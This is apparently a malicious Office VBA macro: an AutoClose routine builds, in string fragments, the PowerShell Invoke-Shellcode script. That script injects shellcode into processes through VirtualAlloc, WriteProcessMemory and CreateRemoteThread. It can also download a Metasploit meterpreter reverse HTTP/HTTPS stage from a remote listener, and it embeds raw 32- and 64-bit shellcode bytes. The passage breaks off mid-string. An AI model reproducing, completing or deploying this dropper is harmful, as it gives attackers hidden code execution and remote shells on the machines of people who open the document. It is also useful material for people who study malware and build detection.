Sub AutoClose()
        OcrhV
End Sub

Public Function OcrhV() As Variant
        Dim Jm As String
        Jm = "function Invoke-Shellcode
{
[CmdletBinding( Defaul"
        Jm = Jm + "tParameterSetName = 'RunLocal', SupportsShouldProc"
        Jm = Jm + "ess = $True , ConfirmImpact = 'High')] Param (
   "
        Jm = Jm + " [ValidateNotNullOrEmpty()]
    [UInt16]
    $Proc"
        Jm = Jm + "essID,
    [Parameter( ParameterSetName = 'RunLoca"
        Jm = Jm + "l' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
"
        Jm = Jm + "    $Shellcode,
    [Parameter( ParameterSetName ="
        Jm = Jm + " 'Metasploit' )]
    [ValidateSet( 'windows/meterp"
        Jm = Jm + "reter/reverse_http',
                  'windows/me"
        Jm = Jm + "terpreter/reverse_https',
                  Ignore"
        Jm = Jm + "Case = $True )]
    [String]
    $Payload = 'windo"
        Jm = Jm + "ws/meterpreter/reverse_http',
    [Parameter( Para"
        Jm = Jm + "meterSetName = 'ListPayloads' )]
    [Switch]
    "
        Jm = Jm + "$ListMetasploitPayloads,
    [Parameter( Mandatory"
        Jm = Jm + " = $True,
                ParameterSetName = 'Meta"
        Jm = Jm + "sploit' )]
    [ValidateNotNullOrEmpty()]
    [Str"
        Jm = Jm + "ing]
    $Lhost = '127.0.0.1',
    [Parameter( Man"
        Jm = Jm + "datory = $True,
                ParameterSetName ="
        Jm = Jm + " 'Metasploit' )]
    [ValidateRange( 1,65535 )]
  "
        Jm = Jm + "  [Int]
    $Lport = 8443,
    [Parameter( Paramet"
        Jm = Jm + "erSetName = 'Metasploit' )]
    [ValidateNotNull()"
        Jm = Jm + "]
    [String]
    $UserAgent = (Get-ItemProperty "
        Jm = Jm + "-Path 'HKCU:\Software\Microsoft\Windows\CurrentVer"
        Jm = Jm + "sion\Internet Settings').'User Agent',
    [Parame"
        Jm = Jm + "ter( ParameterSetName = 'Metasploit' )]
    [Valid"
        Jm = Jm + "ateNotNull()]
    [Switch]
    $Legacy = $False,
 "
        Jm = Jm + "   [Parameter( ParameterSetName = 'Metasploit' )]
"
        Jm = Jm + "    [ValidateNotNull()]
    [Switch]
    $Proxy = "
        Jm = Jm + "$False,
    [Switch]
    $Force = $False
)
    Set"
        Jm = Jm + "-StrictMode -Version 2.0
    if ($PsCmdlet.Paramet"
        Jm = Jm + "erSetName -eq 'ListPayloads')
    {
        $Avail"
        Jm = Jm + "ablePayloads = (Get-Command Invoke-Shellcode).Para"
        Jm = Jm + "meters['Payload'].Attributes |
            Where-O"
        Jm = Jm + "bject {$_.TypeId -eq [System.Management.Automation"
        Jm = Jm + ".ValidateSetAttribute]}
        foreach ($Payload "
        Jm = Jm + "in $AvailablePayloads.ValidValues)
        {
     "
        Jm = Jm + "       New-Object PSObject -Property @{ Payloads ="
        Jm = Jm + " $Payload }
        }
        Return
    }
    if "
        Jm = Jm + "( $PSBoundParameters['ProcessID'] )
    {
        "
        Jm = Jm + "Get-Process -Id $ProcessID -ErrorAction Stop | Out"
        Jm = Jm + "-Null
    }
    function Local:Get-DelegateType
  "
        Jm = Jm + "  {
        Param
        (
            [OutputTyp"
        Jm = Jm + "e([Type])]
            [Parameter( Position = 0)]
"
        Jm = Jm + "            [Type[]]
            $Parameters = (Ne"
        Jm = Jm + "w-Object Type[](0)),
            [Parameter( Posit"
        Jm = Jm + "ion = 1 )]
            [Type]
            $ReturnT"
        Jm = Jm + "ype = [Void]
        )
        $Domain = [AppDomai"
        Jm = Jm + "n]::CurrentDomain
        $DynAssembly = New-Objec"
        Jm = Jm + "t System.Reflection.AssemblyName('ReflectedDelegat"
        Jm = Jm + "e')
        $AssemblyBuilder = $Domain.DefineDynam"
        Jm = Jm + "icAssembly($DynAssembly, [System.Reflection.Emit.A"
        Jm = Jm + "ssemblyBuilderAccess]::Run)
        $ModuleBuilder"
        Jm = Jm + " = $AssemblyBuilder.DefineDynamicModule('InMemoryM"
        Jm = Jm + "odule', $false)
        $TypeBuilder = $ModuleBuil"
        Jm = Jm + "der.DefineType('MyDelegateType', 'Class, Public, S"
        Jm = Jm + "ealed, AnsiClass, AutoClass', [System.MulticastDel"
        Jm = Jm + "egate])
        $ConstructorBuilder = $TypeBuilder"
        Jm = Jm + ".DefineConstructor('RTSpecialName, HideBySig, Publ"
        Jm = Jm + "ic', [System.Reflection.CallingConventions]::Stand"
        Jm = Jm + "ard, $Parameters)
        $ConstructorBuilder.SetI"
        Jm = Jm + "mplementationFlags('Runtime, Managed')
        $Me"
        Jm = Jm + "thodBuilder = $TypeBuilder.DefineMethod('Invoke', "
        Jm = Jm + "'Public, HideBySig, NewSlot, Virtual', $ReturnType"
        Jm = Jm + ", $Parameters)
        $MethodBuilder.SetImplement"
        Jm = Jm + "ationFlags('Runtime, Managed')
        Write-Outpu"
        Jm = Jm + "t $TypeBuilder.CreateType()
    }
    function Loc"
        Jm = Jm + "al:Get-ProcAddress
    {
        Param
        (
 "
        Jm = Jm + "           [OutputType([IntPtr])]
            [Par"
        Jm = Jm + "ameter( Position = 0, Mandatory = $True )]
       "
        Jm = Jm + "     [String]
            $Module,
            [Pa"
        Jm = Jm + "rameter( Position = 1, Mandatory = $True )]
      "
        Jm = Jm + "      [String]
            $Procedure
        )
  "
        Jm = Jm + "      $SystemAssembly = [AppDomain]::CurrentDomain"
        Jm = Jm + ".GetAssemblies() |
            Where-Object { $_.G"
        Jm = Jm + "lobalAssemblyCache -And $_.Location.Split('\\')[-1"
        Jm = Jm + "].Equals('System.dll') }
        $UnsafeNativeMeth"
        Jm = Jm + "ods = $SystemAssembly.GetType('Microsoft.Win32.Uns"
        Jm = Jm + "afeNativeMethods')
        $GetModuleHandle = $Uns"
        Jm = Jm + "afeNativeMethods.GetMethod('GetModuleHandle')
    "
        Jm = Jm + "    $GetProcAddress = $UnsafeNativeMethods.GetMeth"
        Jm = Jm + "od('GetProcAddress', [Type[]]@([System.Runtime.Int"
        Jm = Jm + "eropServices.HandleRef], [String]))
        $Kern3"
        Jm = Jm + "2Handle = $GetModuleHandle.Invoke($null, @($Module"
        Jm = Jm + "))
        $tmpPtr = New-Object IntPtr
        $Ha"
        Jm = Jm + "ndleRef = New-Object System.Runtime.InteropService"
        Jm = Jm + "s.HandleRef($tmpPtr, $Kern32Handle)
        Write-"
        Jm = Jm + "Output $GetProcAddress.Invoke($null, @([System.Run"
        Jm = Jm + "time.InteropServices.HandleRef]$HandleRef, $Proced"
        Jm = Jm + "ure))
    }
    function Local:Emit-CallThreadStub"
        Jm = Jm + " ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [I"
        Jm = Jm + "nt] $Architecture)
    {
        $IntSizePtr = $Ar"
        Jm = Jm + "chitecture / 8
        function Local:ConvertTo-Li"
        Jm = Jm + "ttleEndian ([IntPtr] $Address)
        {
         "
        Jm = Jm + "   $LittleEndianByteArray = New-Object Byte[](0)
 "
        Jm = Jm + "           $Address.ToString("X$($IntSizePtr*2)") "
        Jm = Jm + "-split '([A-F0-9]{2})' | ForEach-Object { if ($_) "
        Jm = Jm + "{ $LittleEndianByteArray += [Byte] ('0x{0}' -f $_)"
        Jm = Jm + " } }
            [System.Array]::Reverse($LittleEn"
        Jm = Jm + "dianByteArray)
            Write-Output $LittleEnd"
        Jm = Jm + "ianByteArray
        }
        $CallStub = New-Obj"
        Jm = Jm + "ect Byte[](0)
        if ($IntSizePtr -eq 8)
     "
        Jm = Jm + "   {
            [Byte[]] $CallStub = 0x48,0xB8   "
        Jm = Jm + "                   # MOV   QWORD RAX, &shellcode
 "
        Jm = Jm + "           $CallStub += ConvertTo-LittleEndian $Ba"
        Jm = Jm + "seAddr       # &shellcode
            $CallStub +="
        Jm = Jm + " 0xFF,0xD0                              # CALL  RA"
        Jm = Jm + "X
            $CallStub += 0x6A,0x00              "
        Jm = Jm + "                # PUSH  BYTE 0
            $CallSt"
        Jm = Jm + "ub += 0x48,0xB8                              # MOV"
        Jm = Jm + "   QWORD RAX, &ExitThread
            $CallStub +="
        Jm = Jm + " ConvertTo-LittleEndian $ExitThreadAddr # &ExitThr"
        Jm = Jm + "ead
            $CallStub += 0xFF,0xD0            "
        Jm = Jm + "                  # CALL  RAX
        }
        el"
        Jm = Jm + "se
        {
            [Byte[]] $CallStub = 0xB8"
        Jm = Jm + "                           # MOV   DWORD EAX, &she"
        Jm = Jm + "llcode
            $CallStub += ConvertTo-LittleEn"
        Jm = Jm + "dian $BaseAddr       # &shellcode
            $Cal"
        Jm = Jm + "lStub += 0xFF,0xD0                              # "
        Jm = Jm + "CALL  EAX
            $CallStub += 0x6A,0x00      "
        Jm = Jm + "                        # PUSH  BYTE 0
           "
        Jm = Jm + " $CallStub += 0xB8                                "
        Jm = Jm + "   # MOV   DWORD EAX, &ExitThread
            $Cal"
        Jm = Jm + "lStub += ConvertTo-LittleEndian $ExitThreadAddr # "
        Jm = Jm + "&ExitThread
            $CallStub += 0xFF,0xD0    "
        Jm = Jm + "                          # CALL  EAX
        }
  "
        Jm = Jm + "      Write-Output $CallStub
    }
    function Lo"
        Jm = Jm + "cal:Inject-RemoteShellcode ([Int] $ProcessID)
    "
        Jm = Jm + "{
        $hProcess = $OpenProcess.Invoke(0x001F0F"
        Jm = Jm + "FF, $false, $ProcessID) # ProcessAccessFlags.All ("
        Jm = Jm + "0x001F0FFF)
        if (!$hProcess)
        {
    "
        Jm = Jm + "        Throw "Unable to open a process handle for"
        Jm = Jm + " PID: $ProcessID"
        }
        $IsWow64 = $fa"
        Jm = Jm + "lse
        if ($64bitCPU) # Only perform theses c"
        Jm = Jm + "hecks if CPU is 64-bit
        {
            $IsWo"
        Jm = Jm + "w64Process.Invoke($hProcess, [Ref] $IsWow64) | Out"
        Jm = Jm + "-Null
            if ((!$IsWow64) -and $PowerShell"
        Jm = Jm + "32bit)
            {
                Throw 'Unable"
        Jm = Jm + " to inject 64-bit shellcode from within 32-bit Pow"
        Jm = Jm + "ershell. Use the 64-bit version of Powershell if y"
        Jm = Jm + "ou want this to work.'
            }
            e"
        Jm = Jm + "lseif ($IsWow64) # 32-bit Wow64 process
          "
        Jm = Jm + "  {
                if ($Shellcode32.Length -eq 0)"
        Jm = Jm + "
                {
                    Throw 'No s"
        Jm = Jm + "hellcode was placed in the $Shellcode32 variable!'"
        Jm = Jm + "
                }
                $Shellcode = $S"
        Jm = Jm + "hellcode32
            }
            else # 64-bit"
        Jm = Jm + " process
            {
                if ($Shellc"
        Jm = Jm + "ode64.Length -eq 0)
                {
            "
        Jm = Jm + "        Throw 'No shellcode was placed in the $She"
        Jm = Jm + "llcode64 variable!'
                }
            "
        Jm = Jm + "    $Shellcode = $Shellcode64
            }
      "
        Jm = Jm + "  }
        else # 32-bit CPU
        {
          "
        Jm = Jm + "  if ($Shellcode32.Length -eq 0)
            {
   "
        Jm = Jm + "             Throw 'No shellcode was placed in the"
        Jm = Jm + " $Shellcode32 variable!'
            }
           "
        Jm = Jm + " $Shellcode = $Shellcode32
        }
        $Remo"
        Jm = Jm + "teMemAddr = $VirtualAllocEx.Invoke($hProcess, [Int"
        Jm = Jm + "Ptr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) #"
        Jm = Jm + " (Reserve|Commit, RWX)
        if (!$RemoteMemAddr"
        Jm = Jm + ")
        {
            Throw "Unable to allocate "
        Jm = Jm + "shellcode memory in PID: $ProcessID"
        }
   "
        Jm = Jm + "     $WriteProcessMemory.Invoke($hProcess, $Remote"
        Jm = Jm + "MemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) |"
        Jm = Jm + " Out-Null
        $ExitThreadAddr = Get-ProcAddres"
        Jm = Jm + "s kernel32.dll ExitThread
        if ($IsWow64)
  "
        Jm = Jm + "      {
            $CallStub = Emit-CallThreadStu"
        Jm = Jm + "b $RemoteMemAddr $ExitThreadAddr 32
        }
    "
        Jm = Jm + "    else
        {
            $CallStub = Emit-Ca"
        Jm = Jm + "llThreadStub $RemoteMemAddr $ExitThreadAddr 64
   "
        Jm = Jm + "     }
        $RemoteStubAddr = $VirtualAllocEx.I"
        Jm = Jm + "nvoke($hProcess, [IntPtr]::Zero, $CallStub.Length,"
        Jm = Jm + " 0x3000, 0x40) # (Reserve|Commit, RWX)
        if "
        Jm = Jm + "(!$RemoteStubAddr)
        {
            Throw "Un"
        Jm = Jm + "able to allocate thread call stub memory in PID: $"
        Jm = Jm + "ProcessID"
        }
        $WriteProcessMemory.I"
        Jm = Jm + "nvoke($hProcess, $RemoteStubAddr, $CallStub, $Call"
        Jm = Jm + "Stub.Length, [Ref] 0) | Out-Null
        $ThreadHa"
        Jm = Jm + "ndle = $CreateRemoteThread.Invoke($hProcess, [IntP"
        Jm = Jm + "tr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, "
        Jm = Jm + "[IntPtr]::Zero)
        if (!$ThreadHandle)
      "
        Jm = Jm + "  {
            Throw "Unable to launch remote thr"
        Jm = Jm + "ead in PID: $ProcessID"
        }
        $CloseHa"
        Jm = Jm + "ndle.Invoke($hProcess) | Out-Null
    }
    functi"
        Jm = Jm + "on Local:Inject-LocalShellcode
    {
        if ($"
        Jm = Jm + "PowerShell32bit) {
            if ($Shellcode32.Le"
        Jm = Jm + "ngth -eq 0)
            {
                Throw 'N"
        Jm = Jm + "o shellcode was placed in the $Shellcode32 variabl"
        Jm = Jm + "e!'
                return
            }
         "
        Jm = Jm + "   $Shellcode = $Shellcode32
        }
        els"
        Jm = Jm + "e
        {
            if ($Shellcode64.Length -e"
        Jm = Jm + "q 0)
            {
                Throw 'No shell"
        Jm = Jm + "code was placed in the $Shellcode64 variable!'
   "
        Jm = Jm + "             return
            }
            $She"
        Jm = Jm + "llcode = $Shellcode64
        }
        $BaseAddre"
        Jm = Jm + "ss = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellco"
        Jm = Jm + "de.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        Jm = Jm + "X)
        if (!$BaseAddress)
        {
          "
        Jm = Jm + "  Throw "Unable to allocate shellcode memory in PI"
        Jm = Jm + "D: $ProcessID"
        }
        [System.Runtime.I"
        Jm = Jm + "nteropServices.Marshal]::Copy($Shellcode, 0, $Base"
        Jm = Jm + "Address, $Shellcode.Length)
        $ExitThreadAdd"
        Jm = Jm + "r = Get-ProcAddress kernel32.dll ExitThread
      "
        Jm = Jm + "  if ($PowerShell32bit)
        {
            $Cal"
        Jm = Jm + "lStub = Emit-CallThreadStub $BaseAddress $ExitThre"
        Jm = Jm + "adAddr 32
        }
        else
        {
       "
        Jm = Jm + "     $CallStub = Emit-CallThreadStub $BaseAddress "
        Jm = Jm + "$ExitThreadAddr 64
        }
        $CallStubAddr"
        Jm = Jm + "ess = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallSt"
        Jm = Jm + "ub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        Jm = Jm + "X)
        if (!$CallStubAddress)
        {
      "
        Jm = Jm + "      Throw "Unable to allocate thread call stub.""
        Jm = Jm + "
        }
        [System.Runtime.InteropServices"
        Jm = Jm + ".Marshal]::Copy($CallStub, 0, $CallStubAddress, $C"
        Jm = Jm + "allStub.Length)
        $ThreadHandle = $CreateThr"
        Jm = Jm + "ead.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $B"
        Jm = Jm + "aseAddress, 0, [IntPtr]::Zero)
        if (!$Threa"
        Jm = Jm + "dHandle)
        {
            Throw "Unable to la"
        Jm = Jm + "unch thread."
        }
        $WaitForSingleObje"
        Jm = Jm + "ct.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
  "
        Jm = Jm + "      $VirtualFree.Invoke($CallStubAddress, $CallS"
        Jm = Jm + "tub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE ("
        Jm = Jm + "0x8000)
        $VirtualFree.Invoke($BaseAddress, "
        Jm = Jm + "$Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RE"
        Jm = Jm + "LEASE (0x8000)
    }
    $IsWow64ProcessAddr = Get"
        Jm = Jm + "-ProcAddress kernel32.dll IsWow64Process
    if ($"
        Jm = Jm + "IsWow64ProcessAddr)
    {
        $IsWow64ProcessD"
        Jm = Jm + "elegate = Get-DelegateType @([IntPtr], [Bool].Make"
        Jm = Jm + "ByRefType()) ([Bool])
        $IsWow64Process = [S"
        Jm = Jm + "ystem.Runtime.InteropServices.Marshal]::GetDelegat"
        Jm = Jm + "eForFunctionPointer($IsWow64ProcessAddr, $IsWow64P"
        Jm = Jm + "rocessDelegate)
        $64bitCPU = $true
    }
  "
        Jm = Jm + "  else
    {
        $64bitCPU = $false
    }
    "
        Jm = Jm + "if ([IntPtr]::Size -eq 4)
    {
        $PowerShel"
        Jm = Jm + "l32bit = $true
    }
    else
    {
        $Power"
        Jm = Jm + "Shell32bit = $false
    }
    if ($PsCmdlet.Parame"
        Jm = Jm + "terSetName -eq 'Metasploit')
    {
        if (!$P"
        Jm = Jm + "owerShell32bit) {
            $RootInvocation = $M"
        Jm = Jm + "yInvocation.Line
            $Response = $True
   "
        Jm = Jm + "         if ( $Force -or ( $Response = $psCmdlet.S"
        Jm = Jm + "houldContinue( "Do you want to launch the payload "
        Jm = Jm + "from x86 Powershell?",
                   "Attempt"
        Jm = Jm + " to execute 32-bit shellcode from 64-bit Powershel"
        Jm = Jm + "l. Note: This process takes about one minute. Be p"
        Jm = Jm + "atient! You will also see some artifacts of the sc"
        Jm = Jm + "ript loading in the other process." ) ) ) { }
    "
        Jm = Jm + "        if ( !$Response )
            {
          "
        Jm = Jm + "      Return
            }
            if ($MyInvo"
        Jm = Jm + "cation.BoundParameters['Force'])
            {
   "
        Jm = Jm + "             $Command = "function $($MyInvocation."
        Jm = Jm + "InvocationName) {`n" + $MyInvocation.MyCommand.Scr"
        Jm = Jm + "iptBlock + "`n}`n$($RootInvocation)`n`n"
         "
        Jm = Jm + "   }
            else
            {
              "
        Jm = Jm + "  $Command = "function $($MyInvocation.InvocationN"
        Jm = Jm + "ame) {`n" + $MyInvocation.MyCommand.ScriptBlock + "
        Jm = Jm + ""`n}`n$($RootInvocation) -Force`n`n"
            }"
        Jm = Jm + "
            $CommandBytes = [System.Text.Encoding"
        Jm = Jm + "]::Ascii.GetBytes($Command)
            $EncodedCo"
        Jm = Jm + "mmand = [Convert]::ToBase64String($CommandBytes)
 "
        Jm = Jm + "           $Execute = '$Command' + " | $Env:windir"
        Jm = Jm + "\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -N"
        Jm = Jm + "oProfile -Command -"
            Invoke-Expression"
        Jm = Jm + " -Command $Execute | Out-Null
            Return
 "
        Jm = Jm + "       }
        $Response = $True
        if ( $F"
        Jm = Jm + "orce -or ( $Response = $psCmdlet.ShouldContinue( ""
        Jm = Jm + "Do you know what you're doing?",
               "A"
        Jm = Jm + "bout to download Metasploit payload '$($Payload)' "
        Jm = Jm + "LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
      "
        Jm = Jm + "  if ( !$Response )
        {
            Return
 "
        Jm = Jm + "       }
        switch ($Payload)
        {
     "
        Jm = Jm + "       'windows/meterpreter/reverse_http'
        "
        Jm = Jm + "    {
                $SSL = ''
            }
    "
        Jm = Jm + "        'windows/meterpreter/reverse_https'
      "
        Jm = Jm + "      {
                $SSL = 's'
               "
        Jm = Jm + " [System.Net.ServicePointManager]::ServerCertifica"
        Jm = Jm + "teValidationCallback = {$True}
            }
     "
        Jm = Jm + "   }
        if ($Legacy)
        {
            $R"
        Jm = Jm + "equest = "http$($SSL)://$($Lhost):$($Lport)/INITM""
        Jm = Jm + "
        } else {
            $CharArray = 48..57 "
        Jm = Jm + "+ 65..90 + 97..122 | ForEach-Object {[Char]$_}
   "
        Jm = Jm + "         $SumTest = $False
            while ($Sum"
        Jm = Jm + "Test -eq $False)
            {
                $Ge"
        Jm = Jm + "neratedUri = $CharArray | Get-Random -Count 4
    "
        Jm = Jm + "            $SumTest = (([int[]] $GeneratedUri | M"
        Jm = Jm + "easure-Object -Sum).Sum % 0x100 -eq 92)
          "
        Jm = Jm + "  }
            $RequestUri = -join $GeneratedUri
"
        Jm = Jm + "            $Request = "http$($SSL)://$($Lhost):$("
        Jm = Jm + "$Lport)/$($RequestUri)"
        }
        $Uri = N"
        Jm = Jm + "ew-Object Uri($Request)
        $WebClient = New-O"
        Jm = Jm + "bject System.Net.WebClient
        $WebClient.Head"
        Jm = Jm + "ers.Add('user-agent', "$UserAgent")
        if ($P"
        Jm = Jm + "roxy)
        {
            $WebProxyObject = New-"
        Jm = Jm + "Object System.Net.WebProxy
            $ProxyAddre"
        Jm = Jm + "ss = (Get-ItemProperty -Path 'HKCU:\Software\Micro"
        Jm = Jm + "soft\Windows\CurrentVersion\Internet Settings').Pr"
        Jm = Jm + "oxyServer
            if ($ProxyAddress)
         "
        Jm = Jm + "   {
                $WebProxyObject.Address = $Pr"
        Jm = Jm + "oxyAddress
                $WebProxyObject.UseDefa"
        Jm = Jm + "ultCredentials = $True
                $WebClientO"
        Jm = Jm + "bject.Proxy = $WebProxyObject
            }
      "
        Jm = Jm + "  }
        try
        {
            [Byte[]] $Sh"
        Jm = Jm + "ellcode32 = $WebClient.DownloadData($Uri)
        "
        Jm = Jm + "}
        catch
        {
            Throw "$($Er"
        Jm = Jm + "ror[0])"
        }
        [Byte[]] $Shellcode64 ="
        Jm = Jm + " $Shellcode32
    }
    elseif ($PSBoundParameters"
        Jm = Jm + "['Shellcode'])
    {
        [Byte[]] $Shellcode32"
        Jm = Jm + " = $Shellcode
        [Byte[]] $Shellcode64 = $She"
        Jm = Jm + "llcode32
    }
    else
    {
        [Byte[]] $Sh"
        Jm = Jm + "ellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0"
        Jm = Jm + "x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
     "
        Jm = Jm + "                             0x52,0x0c,0x8b,0x52,0"
        Jm = Jm + "x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0"
        Jm = Jm + "x31,0xc0,
                                  0xac,0"
        Jm = Jm + "x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0"
        Jm = Jm + "xc7,0xe2,0xf0,0x52,0x57,
                         "
        Jm = Jm + "         0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0"
        Jm = Jm + "x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
          "
        Jm = Jm + "                        0xd0,0x50,0x8b,0x48,0x18,0"
        Jm = Jm + "x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0"
        Jm = Jm + "x8b,
                                  0x01,0xd6,0"
        Jm = Jm + "x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0"
        Jm = Jm + "x38,0xe0,0x75,0xf4,
                              "
        Jm = Jm + "    0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0"
        Jm = Jm + "x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
               "
        Jm = Jm + "                   0x0c,0x4b,0x8b,0x58,0x1c,0x01,0"
        Jm = Jm + "xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
"
        Jm = Jm + "                                  0x5b,0x5b,0x61,0"
        Jm = Jm + "x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0"
        Jm = Jm + "xeb,0x86,0x5d,
                                  0"
        Jm = Jm + "x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0"
        Jm = Jm + "x31,0x8b,0x6f,0x87,0xff,0xd5,
                    "
        Jm = Jm + "              0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0"
        Jm = Jm + "x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
     "
        Jm = Jm + "                             0x80,0xfb,0xe0,0x75,0"
        Jm = Jm + "x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0"
        Jm = Jm + "xd5,0x63,
                                  0x61,0"
        Jm = Jm + "x6c,0x63,0x00)
        [Byte[]] $Shellcode64 = @(0"
        Jm = Jm + "xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0"
        Jm = Jm + "x41,0x51,0x41,0x50,0x52,0x51,
                    "
        Jm = Jm + "              0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0"
        Jm = Jm + "x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
     "
        Jm = Jm + "                             0x20,0x48,0x8b,0x72,0"
        Jm = Jm + "x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0"
        Jm = Jm + "x31,0xc0,
                                  0xac,0"
        Jm = Jm + "x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0"
        Jm = Jm + "x41,0x01,0xc1,0xe2,0xed,
                         "
        Jm = Jm + "         0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0"
        Jm = Jm + "x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
          "
        Jm = Jm + "                        0x00,0x00,0x00,0x48,0x85,0"
        Jm = Jm + "xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0"
        Jm = Jm + "x44,
                                  0x8b,0x40,0"
        Jm = Jm + "x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0"
        Jm = Jm + "x8b,0x34,0x88,0x48,
                              "
        Jm = Jm + "    0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0"
        Jm = Jm + "x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
               "
        Jm = Jm + "                   0x38,0xe0,0x75,0xf1,0x4c,0x03,0"
        Jm = Jm + "x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
"
        Jm = Jm + "                                  0x8b,0x40,0x24,0"
        Jm = Jm + "x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0"
        Jm = Jm + "x40,0x1c,0x49,
                                  0"
        Jm = Jm + "x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0"
        Jm = Jm + "x58,0x41,0x58,0x5e,0x59,0x5a,
                    "
        Jm = Jm + "              0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0"
        Jm = Jm + "x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
     "
        Jm = Jm + "                             0x59,0x5a,0x48,0x8b,0"
        Jm = Jm + "x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0"
        Jm = Jm + "x00,0x00,
                                  0x00,0"
        Jm = Jm + "x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0"
        Jm = Jm + "x00,0x41,0xba,0x31,0x8b,
                         "
        Jm = Jm + "         0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0"
        Jm = Jm + "x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
          "
        Jm = Jm + "                        0xd5,0x48,0x83,0xc4,0x28,0"
        Jm = Jm + "x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0"
        Jm = Jm + "x47,
                                  0x13,0x72,0"
        Jm = Jm + "x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0"
        Jm = Jm + "x61,0x6c,0x63,0x00)
    }
    if ( $PSBoundParamet"
        Jm = Jm + "ers['ProcessID'] )
    {
        $OpenProcessAddr "
        Jm = Jm + "= Get-ProcAddress kernel32.dll OpenProcess
       "
        Jm = Jm + " $OpenProcessDelegate = Get-DelegateType @([UInt32"
        Jm = Jm + "], [Bool], [UInt32]) ([IntPtr])
        $OpenProce"
        Jm = Jm + "ss = [System.Runtime.InteropServices.Marshal]::Get"
        Jm = Jm + "DelegateForFunctionPointer($OpenProcessAddr, $Open"
        Jm = Jm + "ProcessDelegate)
        $VirtualAllocExAddr = Get"
        Jm = Jm + "-ProcAddress kernel32.dll VirtualAllocEx
        $"
        Jm = Jm + "VirtualAllocExDelegate = Get-DelegateType @([IntPt"
        Jm = Jm + "r], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntP"
        Jm = Jm + "tr])
        $VirtualAllocEx = [System.Runtime.Int"
        Jm = Jm + "eropServices.Marshal]::GetDelegateForFunctionPoint"
        Jm = Jm + "er($VirtualAllocExAddr, $VirtualAllocExDelegate)
 "
        Jm = Jm + "       $WriteProcessMemoryAddr = Get-ProcAddress k"
        Jm = Jm + "ernel32.dll WriteProcessMemory
        $WriteProce"
        Jm = Jm + "ssMemoryDelegate = Get-DelegateType @([IntPtr], [I"
        Jm = Jm + "ntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType"
        Jm = Jm + "()) ([Bool])
        $WriteProcessMemory = [System"
        Jm = Jm + ".Runtime.InteropServices.Marshal]::GetDelegateForF"
        Jm = Jm + "unctionPointer($WriteProcessMemoryAddr, $WriteProc"
        Jm = Jm + "essMemoryDelegate)
        $CreateRemoteThreadAddr"
        Jm = Jm + " = Get-ProcAddress kernel32.dll CreateRemoteThread"
        Jm = Jm + "
        $CreateRemoteThreadDelegate = Get-Delegat"
        Jm = Jm + "eType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [I"
        Jm = Jm + "ntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $Cr"
        Jm = Jm + "eateRemoteThread = [System.Runtime.InteropServices"
